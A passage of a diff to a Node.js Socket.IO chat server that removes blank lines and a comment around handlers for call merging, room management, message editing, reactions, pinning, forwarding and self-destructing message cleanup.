     io.to(to).emit('call-ended', { from: socket.id });
   });
-
   // Merge Call – signal a third party to join a conference call
   socket.on('merge-call', ({ to, callerName, type }) => {
     io.to(to).emit('merge-call-invite', {
@@ -1243,7 +1074,6 @@ io.on('connection', (socket) => {
       type: type || 'audio'
     });
   });
-
   // Create Custom Room
   socket.on('create-room', ({ room, isSecret }) => {
     if (!room) return;
@@ -1258,8 +1088,6 @@ io.on('connection', (socket) => {
       }
     }
   });
-
-
   // Delete Custom Room
   socket.on('delete-room', ({ room }) => {
     if (room === 'AetherAIFree General') return;
@@ -1267,9 +1095,7 @@ io.on('connection', (socket) => {
       activeRooms.delete(room);
       messageHistory.delete(room);
       roomSelfDestructTimers.delete(room);
-      
       io.emit('rooms-list', Array.from(activeRooms));
-
       // Redirect connected clients back to AetherAIFree General lobby
       users.forEach((value, key) => {
         if (value.room === room) {
@@ -1278,9 +1104,6 @@ io.on('connection', (socket) => {
       });
     }
   });
-
-  // --- Telegram-like Message Features ---
-
   socket.on('edit-message', ({ room, messageId, newText }) => {
     const username = users.get(socket.id)?.username;
     if (!username || !newText?.trim()) return;
@@ -1293,7 +1116,6 @@ io.on('connection', (socket) => {
       io.to(room).emit('message-edited', { room, messageId, newText: msg.text });
     }
   });
-
   socket.on('delete-message-manual', ({ room, messageId }) => {
     const username = users.get(socket.id)?.username;
     if (!username) return;
@@ -1313,7 +1135,6 @@ io.on('connection', (socket) => {
       }
     }
   });
-
   socket.on('react-message', ({ room, messageId, emoji }) => {
     const username = users.get(socket.id)?.username;
     if (!username || !emoji) return;
@@ -1336,7 +1157,6 @@ io.on('connection', (socket) => {
       io.to(room).emit('reaction-updated', { room, messageId, reactions: reactionData });
     }
   });
-
   socket.on('pin-message', ({ room, messageId }) => {
     const current = roomPinnedMessages.get(room);
     if (current && current.id === messageId) {
@@ -1351,7 +1171,6 @@ io.on('connection', (socket) => {
       }
     }
   });
-
   socket.on('forward-message', ({ fromRoom, toRoom, messageId }) => {
     const username = users.get(socket.id)?.username;
     if (!username) return;
@@ -1381,8 +1200,6 @@ io.on('connection', (socket) => {
     }
   });
 });
-
-
 // Helper to compile global users and emit update
 function sendGlobalUsers() {
   const list = Array.from(persistentUsers.values()).map(u => ({
@@ -1393,7 +1210,6 @@ function sendGlobalUsers() {
   }));
   io.emit('global-users', list);
 }
-
 // Helper to get all users in a specific room and emit to that room
 function sendRoomUsers(room) {
   const roomUsers = [];
@@ -1410,14 +1226,12 @@ function sendRoomUsers(room) {
     users: roomUsers
   });
 }
-
 // Background loop to prune self-destructing messages (runs every 3 seconds)
 setInterval(() => {
   const now = Date.now();
   messageHistory.forEach((history, room) => {
     const expiredIds = [];
     const activeMessages = [];
-
     history.forEach(msg => {
       if (msg.selfDestructAt && new Date(msg.selfDestructAt).getTime() < now) {
         expiredIds.push(msg.id);
@@ -1434,10 +1248,8 @@ setInterval(() => {
         activeMessages.push(msg);
       }
     });
-
     if (expiredIds.length > 0) {
       messageHistory.set(room, activeMessages);
-      
       // Notify clients of deletion triggers
       if (room.startsWith('dm:')) {
         const parts = room.split(':');
@@ -1448,7 +1260,6 @@ setInterval(() => {
     }
   });
 }, 3000);
-
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
